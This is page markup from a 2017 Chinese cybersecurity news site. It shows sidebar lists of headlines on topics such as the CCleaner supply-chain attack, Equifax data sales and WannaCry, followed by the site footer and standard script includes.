                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/170918-Cox-The-Hackers-Hitting-Back-At-Cybercriminals-hero_vkcor5-480x300.gif" width="480" height="300" alt="“黑客反击”的合法化之争">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105921.html" title="“黑客反击”的合法化之争">“黑客反击”的合法化之争</a></p>
                            <p class="item-date">2017年9月20日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105917.html" title="美参议员要求电信巨头们回应SS7信令系统的安全问题">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG929-480x300.jpeg" width="480" height="300" alt="美参议员要求电信巨头们回应SS7信令系统的安全问题">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105917.html" title="美参议员要求电信巨头们回应SS7信令系统的安全问题">美参议员要求电信巨头们回应SS7信令系统的安全问题</a></p>
                            <p class="item-date">2017年9月19日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105914.html" title="美国国土安全部发布禁止使用卡巴斯基产品的明细">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG928-480x300.jpeg" width="480" height="300" alt="美国国土安全部发布禁止使用卡巴斯基产品的明细">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105914.html" title="美国国土安全部发布禁止使用卡巴斯基产品的明细">美国国土安全部发布禁止使用卡巴斯基产品的明细</a></p>
                            <p class="item-date">2017年9月19日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105885.html" title="【威胁预警】供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG906-480x300.jpeg" width="480" height="300" alt="【威胁预警】供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105885.html" title="【威胁预警】供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）">【威胁预警】供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）</a></p>
                            <p class="item-date">2017年9月19日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105879.html" title="全球首款网络安全概念车驶入上海滩">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/15057198871-480x300.png" width="480" height="300" alt="全球首款网络安全概念车驶入上海滩">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105879.html" title="全球首款网络安全概念车驶入上海滩">全球首款网络安全概念车驶入上海滩</a></p>
                            <p class="item-date">2017年9月18日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105872.html" title="暗网市场上开始兜售Equifax的数据，数据泄漏后常见的诈骗招数1、2、3">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG897-480x300.jpeg" width="480" height="300" alt="暗网市场上开始兜售Equifax的数据，数据泄漏后常见的诈骗招数1、2、3">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105872.html" title="暗网市场上开始兜售Equifax的数据，数据泄漏后常见的诈骗招数1、2、3">暗网市场上开始兜售Equifax的数据，数据泄漏后常见的诈骗招数1、2、3</a></p>
                            <p class="item-date">2017年9月18日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105865.html" title="美国财政部确认伊朗11个实体的恶意网络活动，宣布对它们实施制裁">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG896-480x300.jpeg" width="480" height="300" alt="美国财政部确认伊朗11个实体的恶意网络活动，宣布对它们实施制裁">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105865.html" title="美国财政部确认伊朗11个实体的恶意网络活动，宣布对它们实施制裁">美国财政部确认伊朗11个实体的恶意网络活动，宣布对它们实施制裁</a></p>
                            <p class="item-date">2017年9月18日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105858.html" title="DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG150-480x300.jpeg" width="480" height="300" alt="DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105858.html" title="DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护">DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护</a></p>
                            <p class="item-date">2017年9月17日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105847.html" title="国家网络安全周开幕 大安全时代360前沿“黑科技”震撼登场">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG141-480x300.jpeg" width="480" height="300" alt="国家网络安全周开幕 大安全时代360前沿“黑科技”震撼登场">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105847.html" title="国家网络安全周开幕 大安全时代360前沿“黑科技”震撼登场">国家网络安全周开幕 大安全时代360前沿“黑科技”震撼登场</a></p>
                            <p class="item-date">2017年9月16日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105837.html" title="黑客组织OurMine窃取Vevo约3.12TB数据，疑似后者已妥协">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG132-480x300.jpeg" width="480" height="300" alt="黑客组织OurMine窃取Vevo约3.12TB数据，疑似后者已妥协">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105837.html" title="黑客组织OurMine窃取Vevo约3.12TB数据，疑似后者已妥协">黑客组织OurMine窃取Vevo约3.12TB数据，疑似后者已妥协</a></p>
                            <p class="item-date">2017年9月16日</p>
                        </div>
                    </li>
                            </ul>
        </div><div id="lastest-products-4" class="widget widget_lastest_products">            <ul class="p-list clearfix">
                                    <li class="col-xs-12 col-md-6 p-item">
                        <div class="p-item-wrap">
                            <a class="thumb" href="http://www.mottoin.com/105921.html">
                                <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/170918-Cox-The-Hackers-Hitting-Back-At-Cybercriminals-hero_vkcor5-480x300.gif" width="480" height="300" alt="“黑客反击”的合法化之争">                            </a>
                            <h4 class="title">
                                <a href="http://www.mottoin.com/105921.html" title="“黑客反击”的合法化之争">
                                    “黑客反击”的合法化之争                                </a>
                            </h4>
                        </div>
                    </li>
                                    <li class="col-xs-12 col-md-6 p-item">
                        <div class="p-item-wrap">
                            <a class="thumb" href="http://www.mottoin.com/105858.html">
                                <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG150-480x300.jpeg" width="480" height="300" alt="DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护">                            </a>
                            <h4 class="title">
                                <a href="http://www.mottoin.com/105858.html" title="DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护">
                                    DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护                                </a>
                            </h4>
                        </div>
                    </li>
                                    <li class="col-xs-12 col-md-6 p-item">
                        <div class="p-item-wrap">
                            <a class="thumb" href="http://www.mottoin.com/105847.html">
                                <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG141-480x300.jpeg" width="480" height="300" alt="国家网络安全周开幕 大安全时代360前沿“黑科技”震撼登场">                            </a>
                            <h4 class="title">
                                <a href="http://www.mottoin.com/105847.html" title="国家网络安全周开幕 大安全时代360前沿“黑科技”震撼登场">
                                    国家网络安全周开幕 大安全时代360前沿“黑科技”震撼登场                                </a>
                            </h4>
                        </div>
                    </li>
                                    <li class="col-xs-12 col-md-6 p-item">
                        <div class="p-item-wrap">
                            <a class="thumb" href="http://www.mottoin.com/105799.html">
                                <img width="480" height="300" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" class="attachment-post-thumbnail size-post-thumbnail j-lazy wp-post-image" alt="暗网系列之：“入店行窃者”的工具、战术和克星" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/15054708381-150x150-480x300.png" />                            </a>
                            <h4 class="title">
                                <a href="http://www.mottoin.com/105799.html" title="暗网系列之：“入店行窃者”的工具、战术和克星">
                                    暗网系列之：“入店行窃者”的工具、战术和克星                                </a>
                            </h4>
                        </div>
                    </li>
                                    <li class="col-xs-12 col-md-6 p-item">
                        <div class="p-item-wrap">
                            <a class="thumb" href="http://www.mottoin.com/105703.html">
                                <img width="480" height="300" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" class="attachment-post-thumbnail size-post-thumbnail j-lazy wp-post-image" alt="【现场还原】补天漏洞情报发布会记事" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG82-150x150-480x300.jpeg" />                            </a>
                            <h4 class="title">
                                <a href="http://www.mottoin.com/105703.html" title="【现场还原】补天漏洞情报发布会记事">
                                    【现场还原】补天漏洞情报发布会记事                                </a>
                            </h4>
                        </div>
                    </li>
                                    <li class="col-xs-12 col-md-6 p-item">
                        <div class="p-item-wrap">
                            <a class="thumb" href="http://www.mottoin.com/105692.html">
                                <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG75-480x300.jpeg" width="480" height="300" alt="SyScan360看点回顾：中美德俄等七国黑客专家神技大比拼">                            </a>
                            <h4 class="title">
                                <a href="http://www.mottoin.com/105692.html" title="SyScan360看点回顾：中美德俄等七国黑客专家神技大比拼">
                                    SyScan360看点回顾：中美德俄等七国黑客专家神技大比拼                                </a>
                            </h4>
                        </div>
                    </li>
                                    <li class="col-xs-12 col-md-6 p-item">
                        <div class="p-item-wrap">
                            <a class="thumb" href="http://www.mottoin.com/105642.html">
                                <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG58-480x300.jpeg" width="480" height="300" alt="大安全时代序幕开启！ 中国互联网安全大会重新定义网络安全">                            </a>
                            <h4 class="title">
                                <a href="http://www.mottoin.com/105642.html" title="大安全时代序幕开启！ 中国互联网安全大会重新定义网络安全">
                                    大安全时代序幕开启！ 中国互联网安全大会重新定义网络安全                                </a>
                            </h4>
                        </div>
                    </li>
                                    <li class="col-xs-12 col-md-6 p-item">
                        <div class="p-item-wrap">
                            <a class="thumb" href="http://www.mottoin.com/105621.html">
                                <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG512-480x300.jpeg" width="480" height="300" alt="【重磅推出】ISC大会补天漏洞情报服务发布会：英雄，你准备好了吗？">                            </a>
                            <h4 class="title">
                                <a href="http://www.mottoin.com/105621.html" title="【重磅推出】ISC大会补天漏洞情报服务发布会：英雄，你准备好了吗？">
                                    【重磅推出】ISC大会补天漏洞情报服务发布会：英雄，你准备好了吗？                                </a>
                            </h4>
                        </div>
                    </li>
                                    <li class="col-xs-12 col-md-6 p-item">
                        <div class="p-item-wrap">
                            <a class="thumb" href="http://www.mottoin.com/105629.html">
                                <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG49-480x300.jpeg" width="480" height="300" alt="ISC直击：360守护者计划登陆ISC 最强白帽挑战黑客马拉松大奖赛">                            </a>
                            <h4 class="title">
                                <a href="http://www.mottoin.com/105629.html" title="ISC直击：360守护者计划登陆ISC 最强白帽挑战黑客马拉松大奖赛">
                                    ISC直击：360守护者计划登陆ISC 最强白帽挑战黑客马拉松大奖赛                                </a>
                            </h4>
                        </div>
                    </li>
                                    <li class="col-xs-12 col-md-6 p-item">
                        <div class="p-item-wrap">
                            <a class="thumb" href="http://www.mottoin.com/105603.html">
                                <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG42-480x300.jpeg" width="480" height="300" alt="【ISC2017精彩剪辑】周鸿祎：大安全时代 网络空间防御刻不容缓">                            </a>
                            <h4 class="title">
                                <a href="http://www.mottoin.com/105603.html" title="【ISC2017精彩剪辑】周鸿祎：大安全时代 网络空间防御刻不容缓">
                                    【ISC2017精彩剪辑】周鸿祎：大安全时代 网络空间防御刻不容缓                                </a>
                            </h4>
                        </div>
                    </li>
                            </ul>
        </div>        </aside>
    </div>
<div class="modal" id="login-modal">
    <div class="modal-dialog modal-sm">
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
                <h4 class="modal-title">请登录</h4>
            </div>
            <div class="modal-body login-modal-body">
                <p>您还未登录，请登录后再进行相关操作！</p>
                <div class="login-btn">
                    <a class="btn btn-login" href="http://www.mottoin.com/login">登 录</a>
                    <a class="btn btn-register" href="http://www.mottoin.com/register">注 册</a>
                </div>
            </div>
        </div>
    </div>
</div>
</div>
<footer class="footer">
    <div class="container">
        <div class="clearfix">
                        <div class="footer-col footer-col-logo">
                <img src="http://www.mottoin.com/img/mottoin/tmxk.png" alt="MottoIN">
            </div>
                        <div class="footer-col footer-col-copy">
                <ul class="footer-nav hidden-xs"><li id="menu-item-104182" class="menu-item menu-item-104182"><a href="http://www.mottoin.com/about">关于我们</a></li>
<li id="menu-item-104181" class="menu-item menu-item-104181"><a href="http://www.mottoin.com/dis">免责声明</a></li>
<li id="menu-item-104183" class="menu-item menu-item-104183"><a href="http://www.mottoin.com/joinus">加入我们</a></li>
<li id="menu-item-105509" class="menu-item menu-item-105509"><a href="http://www.mottoin.com/contact">联系我们</a></li>
<li id="menu-item-104184" class="menu-item menu-item-104184"><a href="http://www.mottoin.com/report">寻求报道</a></li>
<li id="menu-item-104185" class="menu-item menu-item-104185"><a href="http://www.mottoin.com/contribute">我要投稿</a></li>
</ul>                <div class="copyright">
                    Copyright © 2017 MottoIN 版权所有 <a href="http://www.miibeian.gov.cn/">沪ICP备16010654号-5</a>  <img class="alignnone " src="http://www.mottoin.com/img/mottoin/ga.png" width="16" height="16" /> <a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=31010402001331">沪公网安备31010402001331号</a>                 </div>
            </div>
            <div class="footer-col footer-col-sns">
                <div class="footer-sns">
                                                                                    <a class="sns-wx" href="javascript:;">
                            <i class="fa fa-weixin"></i>
                            <span style="background-image:url(http://www.mottoin.com/img/mottoin/weixin.jpg);"></span>
                        </a>
                                                                <a target="_blank" href="http://weibo.com/mottoin" rel="nofollow"><i class="fa fa-weibo"></i></a>
                                                                <a target="_blank" href="http://weibo.com/mottoin" rel="nofollow"><i class="fa fa-tencent-weibo"></i></a>
                                                                                                                                                                                </div>
            </div>
        </div>
    </div>
</footer>
<div class="action" style="top:50%;">
            <div class="a-box contact">
            <div class="contact-wrap">
                <h3 class="contact-title">联系我们</h3>
                <h4 style="text-align: center;"><span style="color: #2d6ded;"><strong>021-62666911</strong></span></h4>
<p>在线咨询：<a href="http://wpa.qq.com/msgrd?uin=19539638" target="_blank" rel="noopener"><img class="alignnone" title="点击这里给我发消息" src="http://wpa.qq.com/pa?p=2:1666839010:51" alt="点击这里给我发消息" border="0" /></a></p>
<p>邮件：root@mottoin.com</p>
<p>工作时间：周一至周五，9:30-18:30，节假日休息</p>
            </div>
        </div>
                <div class="a-box wechat">
            <div class="wechat-wrap">
                <img src="http://www.mottoin.com/img/mottoin/weixin.jpg" alt="QR code">
            </div>
        </div>
            <div class="a-box gotop" id="j-top" style="display: none;"></div>
</div>
<style>.footer{padding-bottom: 35px;}</style><div id="um_upload_single" style="display:none">
	
</div><div id="um_view_photo" style="display:none">

	<a href="#" data-action="um_remove_modal" class="um-modal-close"><i class="um-faicon-times"></i></a>
	
	<div class="um-modal-body photo">
	
		<div class="um-modal-photo">

		</div>

	</div>
	
</div><script type='text/javascript'>
/* <![CDATA[ */
var _wpcom_js = {"ajaxurl":"http:\/\/www.mottoin.com\/wp-admin\/admin-ajax.php"};
/* ]]> */
</script>
<script type='text/javascript' src='http://www.mottoin.com/wp-content/themes/JustNews/js/main.js?ver=2.3.2'></script>
<script type='text/javascript' src='http://www.mottoin.com/wp-includes/js/comment-reply.min.js?ver=4.8.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpcom_qa_js = {"ajaxurl":"http:\/\/www.mottoin.com\/wp-admin\/admin-ajax.php","ajaxloading":"http:\/\/www.mottoin.com\/wp-content\/plugins\/wpcom-qa\/images\/loading.gif"};
/* ]]> */
</script>
<script type='text/javascript' src='http://www.mottoin.com/wp-content/plugins/wpcom-qa/js/scripts.min.js?ver=1.0'></script>
<script type='text/javascript' src='http://www.mottoin.com/wp-includes/js/imagesloaded.min.js?ver=3.2.0'></script>
<script type='text/javascript' src='http://www.mottoin.com/wp-includes/js/masonry.min.js?ver=3.3.2'></script>
<script type='text/javascript' src='http://www.mottoin.com/wp-includes/js/jquery/jquery.masonry.min.js?ver=3.1.2b'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var um_scripts = {"ajaxurl":"http:\/\/www.mottoin.com\/wp-admin\/admin-ajax.php","fileupload":"http:\/\/www.mottoin.com\/wp-content\/plugins\/ultimate-member\/core\/lib\/upload\/um-file-upload.php","imageupload":"http:\/\/www.mottoin.com\/wp-content\/plugins\/ultimate-member\/core\/lib\/upload\/um-image-upload.php"};
/* ]]> */
</script>
<script type='text/javascript' src='http://www.mottoin.com/wp-content/plugins/ultimate-member/assets/js/um.min.js?ver=10.3.88'></script>
<script type='text/javascript' src='http://www.mottoin.com/wp-content/plugins/ultimate-member/assets/js/pickadate/translations/zh_CN.js?ver=10.3.88'></script>
<script type='text/javascript' src='http://www.mottoin.com/wp-includes/js/wp-embed.min.js?ver=4.8.1'></script>

		<script type="text/javascript">jQuery( '#request' ).val( '' );</script>

	    <script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":["mshare","tsina","weixin","qzone","sqq","douban","fbook","twi","bdhome","tqq","tieba","mail","youdao","print"],"bdPic":"","bdStyle":"1","bdSize":"16"},"share":[{"tag" : "single", "bdSize" : 16}, {"tag" : "global","bdSize" : 16,bdPopupOffsetLeft:-227}],url:'http://www.mottoin.com/wp-content/themes/JustNews'};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://www.mottoin.com/wp-content/themes/JustNews/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
</body>
</html>